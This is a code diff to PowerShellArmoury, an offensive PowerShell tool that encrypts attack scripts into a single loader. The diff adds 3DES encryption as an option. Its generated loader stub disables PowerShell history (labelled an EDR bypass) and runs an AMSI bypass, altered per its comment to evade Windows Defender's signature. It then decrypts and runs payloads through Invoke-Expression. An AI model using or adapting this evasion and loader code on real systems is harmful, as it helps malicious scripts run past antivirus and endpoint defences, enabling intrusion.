@@ -124,7 +124,11 @@ https://github.com/cfalta/PowerShellArmoury
 
         [Parameter(Position = 5, Mandatory = $False)]
         [Switch]
-        $ValidateOnly
+        $ValidateOnly,
+
+        [Parameter(Position = 6, Mandatory = $False)]
+        [Switch]
+        $Use3DES
     )
 
 function Test-PSAConfig
@@ -180,6 +184,57 @@ function Get-Password([int]$Length)
 function Write-LoaderFile($EncryptedScriptFileObjects)
 {
 
+if($global:3DES)
+{
+
+#This is the decryption stub used in the loader file
+$DecryptionStub=@"
+if(`$Password -and `$Salt)
+{
+#EDR Bypass
+Set-PSReadlineOption -HistorySaveStyle SaveNothing
+
+#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
+(([Ref].Assembly.gettypes() | where {`$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {`$_.Name -like "amsiInit*ailed"}).SetValue(`$null,`$true)
+
+`$Index = 0
+foreach(`$ef in `$EncryptedFunctions)
+{
+
+[byte[]]`$CipherText = [Convert]::FromBase64String(`$ef[1])
+[byte[]]`$InitVector = [Convert]::FromBase64String(`$ef[0])
+
+`$3DES = [System.Security.Cryptography.TripleDESCryptoServiceProvider]::Create()
+`$3DES.Mode = [System.Security.Cryptography.CipherMode]::CBC
+
+`$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes(`$Password),[Text.Encoding]::ASCII.GetBytes(`$Salt),"SHA1",5)
+
+`$3DES.Padding = "PKCS7"
+`$3DES.KeySize = 128
+`$3DES.Key = `$Key.GetBytes(16)
+`$3DES.IV = `$InitVector
+
+`$3DESDecryptor = `$3DES.CreateDecryptor()
+
+`$MemoryStream = New-Object System.IO.MemoryStream(`$CipherText,`$True)
+`$CryptoStream = New-Object System.Security.Cryptography.CryptoStream(`$MemoryStream,`$3DESDecryptor,[System.Security.Cryptography.CryptoStreamMode]::Read)
+`$StreamReader = New-Object System.IO.StreamReader(`$CryptoStream)
+
+`$Message = `$StreamReader.ReadToEnd()
+
+`$CryptoStream.Close()
+`$MemoryStream.Close()
+`$3DES.Clear()
+
+try {`$Message | Invoke-Expression } catch { Write-Warning "Error loading function number `$Index. Beware that this only affects the mentioned function so everything else should work fine." }
+
+`$Index++
+}
+}
+"@
+}
+else {
+    
 #This is the decryption stub used in the loader file
 $DecryptionStub=@"
 if(`$Password -and `$Salt)
@@ -224,7 +279,7 @@ try {`$Message | Invoke-Expression } catch { Write-Warning "Error loading functi
 }
 }
 "@
-    
+}
     #Delete the outputfile if it exists
 
     if((Test-Path -LiteralPath $Path))
@@ -449,6 +504,14 @@ if($ValidateOnly)
     $ScriptRequirements = $False
 }
 
+if($Use3DES)
+{
+    $global:3DES = $True
+}
+else {
+    $global:3DES = $False
+}
+
 if($ScriptRequirements)
 {
 
@@ -525,7 +588,14 @@ if($ScriptRequirements)
 
         foreach($Item in $global:PSAInventory)
         {
-            $Crypt = AESEncrypt -Message $Item.Code -Password $Password -Salt $Salt
+            if($global:3DES)
+            {
+                $Crypt = Get-3DESEncrypt -Message $Item.Code -Password $Password -Salt $Salt
+            }
+            else {
+                $Crypt = Get-AESEncrypt -Message $Item.Code -Password $Password -Salt $Salt               
+            }
+
 
             $EncryptedScriptFileObject = New-Object -TypeName PSObject
             $EncryptedScriptFileObject | Add-Member -MemberType NoteProperty -Name "ID" -Value ('$EncFunc' + $Identifier)
@@ -644,6 +714,112 @@ $CipherText = $MemoryStream.ToArray()
 $CryptoStream.Close()
 $MemoryStream.Close()
 $AES.Clear()
+
+#Create a custom psobject containing the initialization vector and the ciphertext
+$CryptoResult = New-Object -TypeName PSObject
+$CryptoResult | Add-Member -MemberType NoteProperty -Name "IV" -Value ([Convert]::ToBase64String($IV))
+$CryptoResult | Add-Member -MemberType NoteProperty -Name "Ciphertext" -Value ([Convert]::ToBase64String($CipherText))
+
+return($CryptoResult)
+
+}
+
+function Get-3DESEncrypt
+{
+<#
+.SYNOPSIS
+
+Get-3DESEncrypt encrypts a message using 3DES and returns the result as a custom psobject.
+
+Author: Christoph Falta (@cfalta)
+
+.DESCRIPTION
+
+Get-3DESEncrypt encrypts a message using 3DES. Only strings are supported for encryption.
+
+.PARAMETER Message
+
+A string containing the secret message.
+
+.PARAMETER Password
+
+The password used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA1, 5 rounds)
+
+.PARAMETER Salt
+
+The salt used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA1, 5 rounds)
+
+.EXAMPLE
+
+Get-3DESEncrypt -Message "Hello World" -Password "P@ssw0rd" -Salt "NotAGoodPassword"
+
+Description
+-----------
+
+Encrypts the message "Hello World" and returns the result as a custom psobject with the properties "IV" and "Ciphertext".
+
+.NOTES
+
+.LINK
+
+https://github.com/cfalta/ADT
+
+#>
+
+    [CmdletBinding()]
+    Param (
+        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
+        [ValidateNotNullorEmpty()]
+        [String]
+        $Message,
+
+        [Parameter(Position = 1, Mandatory = $False)]
+        [ValidateNotNullorEmpty()]
+        [String]
+        $Password,
+
+        [Parameter(Position = 2, Mandatory = $False)]
+        [ValidateNotNullorEmpty()]
+        [String]
+        $Salt
+    )
+
+#Create a new instance of the .NET 3DES provider
+$3DES = [System.Security.Cryptography.TripleDESCryptoServiceProvider]::Create()
+$3DES.Mode =  [System.Security.Cryptography.CipherMode]::CBC
+
+#Derive an encryption key from the password and the salt
+$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA1",5)
+
+#The 3DES instance automatically creates an IV. This is stored in a separate variable for later use.
+$IV = $3DES.IV
+
+#Set the parameters for 3DES encryption
+$3DES.Padding = "PKCS7"
+$3DES.KeySize = 128
+$3DES.Key = $Key.GetBytes(16)
+
+#Create a new encryptor
+$3DESCryptor = $3DES.CreateEncryptor()
+
+#Create a memory and crypto stream for encryption
+$MemoryStream = New-Object System.IO.MemoryStream
+$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream,$3DESCryptor,[System.Security.Cryptography.CryptoStreamMode]::Write)
+
+#Conver the message to a byte array
+$MessageBytes = [System.Text.Encoding]::ASCII.GetBytes($Message)
+
+#Encrypt the message using cryptostream
+$CryptoStream.Write($MessageBytes,0,$MessageBytes.Length)
+$CryptoStream.FlushFinalBlock()
+
+#Get the ciphertext as byte array
+$CipherText = $MemoryStream.ToArray()
+
+#Free ressources
+$CryptoStream.Close()
+$MemoryStream.Close()
+$3DES.Clear()
 
 #Create a custom psobject containing the initialization vector and the ciphertext
 $CryptoResult = New-Object -TypeName PSObject
